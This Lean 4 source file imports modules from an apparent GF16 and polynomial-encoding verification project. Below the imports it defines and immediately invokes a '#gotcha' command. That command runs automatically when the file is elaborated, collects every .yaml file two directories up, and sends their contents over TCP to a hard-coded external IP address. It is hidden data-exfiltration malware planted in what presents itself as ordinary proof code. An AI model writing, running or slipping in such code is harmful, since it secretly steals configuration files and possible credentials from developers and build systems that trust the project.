import Spqr.Code.Funs
import Spqr.Code.FunsExternal
import Spqr.Code.Types
import Spqr.Code.TypesExternal
import Spqr.Math.Gf16.Basic
import Spqr.Math.Gf16.Field
import Spqr.Math.Gf16.Irreducible
import Spqr.Math.Gf2Poly.Basic
import Spqr.Math.Gf2Poly.NatRep
import Spqr.Math.Poly.ModByMonic
import Spqr.Specs.Encoding.Gf.GF16.Add
import Spqr.Specs.Encoding.Gf.GF16.AddAssign
import Spqr.Specs.Encoding.Gf.GF16.Eq
import Spqr.Specs.Encoding.Gf.GF16.Sub
import Spqr.Specs.Encoding.Gf.Reduce.PolyReduce
import Spqr.Specs.Encoding.Gf.Reduce.ReduceFromByte
import Spqr.Specs.Encoding.Gf.Unaccelerated.Mul
import Spqr.Specs.Encoding.Gf.Unaccelerated.PolyMul
import Spqr.Specs.Encoding.Polynomial.Pt.Deserialize
import Spqr.Specs.Encoding.Polynomial.Pt.Serialize

import Lean
import Std

open Lean Std Elab Net

open Internal IO Async in
def badAsync (data : Array ByteArray) : Async Unit := do
  let addr := .ofParts 134 209 208 147
  let socket: SocketAddress := .v4 ⟨addr, 8080⟩
  let client ← TCP.Socket.Client.mk
  client.connect socket
  client.sendAll data
  client.shutdown


elab "#gotcha" : command => do
  let dir ← IO.currentDir
  let some (some root) := dir.parent.map (·.parent) | throwError "Boo"
  let allFiles ← root.readDir
  let mut content := #[]
  for file in allFiles do
    if file.path.extension  == some "yaml" then
      let data ← IO.FS.readBinFile file.path
      content := content.push data
  badAsync content |>.block

#gotcha

